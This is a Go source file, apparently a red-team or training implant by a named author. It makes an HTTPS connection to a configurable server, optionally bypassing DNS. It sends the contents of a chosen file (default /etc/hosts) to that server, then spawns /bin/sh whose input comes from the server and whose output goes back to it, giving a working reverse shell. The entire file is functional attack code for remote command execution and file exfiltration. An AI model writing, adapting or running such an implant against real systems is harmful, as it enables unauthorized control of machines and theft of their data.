// Program comms_without_dns - coms_over_https but without a DNS lookup
package main

/*
 * comms_without_dns.go
 * comms_over_https but without a DNS lookup
 * By J. Stuart McMurray
 * Created 20240905
 * Last Modified 20240906
 */

import (
	"cmp"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"syscall"
)

// Compile-time configurables
var (
	Address           = "https://localhost:4444/shell"
	AddressEnvVar     = "ALPT4ATS_ADDRESS"
	File              = "/etc/hosts"
	FileEnvVar        = "ALPT4ATS_FILE"
	RealAddressEnvVar = "ALPT4ATS_REAL_ADDRESS"
)

// ConfFD is the file descriptor from which we might read our config.
const ConfFD = 7

func main() {
	/* Config from environment overrides compile-time config. */
	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
	File = cmp.Or(os.Getenv(FileEnvVar), File)

	/* Config from file descriptor 7 overrides config from environment. */
	if _, err := fmt.Fscan(
		os.NewFile(uintptr(ConfFD), "config"),
		&Address,
		&File,
	); nil != err && !errors.Is(err, io.EOF) &&
		!errors.Is(err, syscall.EBADF) {
		log.Fatalf("Error reading config from FD %d: %s", ConfFD, err)
	}

	/* Don't do DNS resolution if we have a real address already. */
	if ra, ok := os.LookupEnv(RealAddressEnvVar); ok {
		dial := func(
			ctx context.Context,
			network, addr string,
		) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, ra)
		}
		http.DefaultTransport.(*http.Transport).DialContext = dial
	}

	/* Connect to the server. */
	pr, pw := io.Pipe()
	res, err := http.Post(Address, "", pr)
	if nil != err {
		log.Fatalf("HTTPS request error: %s", err)
	}

	/* Send back the file. */
	b, err := os.ReadFile(File)
	if nil != err {
		log.Fatalf("Error reading file: %s", err)
	}
	if _, err := pw.Write(b); nil != err {
		log.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = res.Body
	sh.Stdout = pw
	sh.Stderr = pw
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
